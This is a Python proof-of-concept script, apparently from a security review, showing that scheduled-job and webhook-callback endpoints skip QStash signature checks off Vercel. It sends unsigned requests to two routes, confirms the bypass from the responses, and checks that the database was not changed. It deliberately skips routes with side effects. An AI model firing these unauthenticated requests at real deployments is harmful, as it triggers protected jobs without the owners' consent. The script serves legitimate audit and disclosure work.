#!/usr/bin/env python3
"""PM-13 — scheduled-job and webhook-callback endpoints verify their QStash
signature only when process.env.VERCEL === "1". On any other deployment the check
is skipped, so anyone on the internet can invoke them unauthenticated.

This proof demonstrates the bypass on BOTH verification styles without side
effects:

  * the shared helper (`verifyQstashSignature`) via `/api/webhooks/callback` with
    a nonexistent webhookId — execution reaches the database lookup and returns
    "Webhook not found" *before* any event is recorded, so nothing is written;
  * the inline `if (process.env.VERCEL === "1")` style via
    `/api/cron/dataroom-digest/daily`, which is idempotent (drains an empty queue).

Routes with external or mutating side effects are deliberately not fired — see the
SKIP lines.

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/pm-13-unauthenticated-scheduled-jobs/poc.py
"""
import sys
import pathlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
from pmpoc import (  # noqa: E402
    BASE, db_close, post, table_counts, count_delta,
    VULN, CONTROL, OBSERVE, SKIP, log, summary,
)

log(f"PM-13 — scheduled jobs unauthenticated off Vercel   base={BASE}")
log("  Precondition: the deployment is not on Vercel (process.env.VERCEL != '1').")
log("  On Vercel these routes verify the Upstash-Signature and return 401.")
log("")

before = table_counts()

# ---- helper-style bypass: /api/webhooks/callback (no signature header) -------
# A nonexistent webhookId makes the handler return "Webhook not found" BEFORE
# recordWebhookEvent, so reaching that response proves verifyQstashSignature
# returned without checking, and nothing is written.
cb_status, cb_text, _ = post(
    "/api/webhooks/callback?webhookId=pm13-nonexistent&eventId=pm13&event=document.created",
    {"status": 200, "url": "http://example.invalid", "createdAt": 0,
     "sourceMessageId": "pm13", "sourceBody": "", "body": ""},
)
OBSERVE("webhooks/callback response", f"HTTP {cb_status} body={cb_text[:40]!r}")
VULN("the shared verifyQstashSignature guard is skipped with no Upstash-Signature",
     cb_status == 200 and "Webhook not found" in cb_text,
     "reached the DB lookup unauthenticated")

# ---- inline-style bypass: /api/cron/dataroom-digest/daily (no signature) -----
dd_status, dd_text, _ = post("/api/cron/dataroom-digest/daily", {})
OBSERVE("cron/dataroom-digest/daily response", f"HTTP {dd_status} body={dd_text[:50]!r}")
VULN("the inline 'if (VERCEL === 1)' guard is skipped with no Upstash-Signature",
     dd_status != 401, f"HTTP {dd_status} (401 would mean the signature was enforced)")

# ---- confirm no mutation from the callback probe ----------------------------
after = table_counts()
delta = count_delta(before, after)
CONTROL("the callback probe wrote nothing (Webhook-not-found path precedes the write)",
        len(delta) == 0, str(delta) if delta else "0 row changes")

# ---- routes deliberately not fired ------------------------------------------
SKIP("cron/domains", "fires external Vercel domain-API calls per domain; source-confirmed "
     "to share the inline VERCEL guard")
SKIP("cron/welcome-user", "sends a welcome email downstream (reaches past the helper guard: "
     "historically HTTP 500 on the email step, not 401)")
SKIP("full webhook-event forgery", "writing a forged delivery record needs a real webhookId "
     "and mutates the team's webhook event log; the no-write path above already proves the bypass")

summary("PM-13 unauthenticated scheduled jobs off Vercel")
db_close()
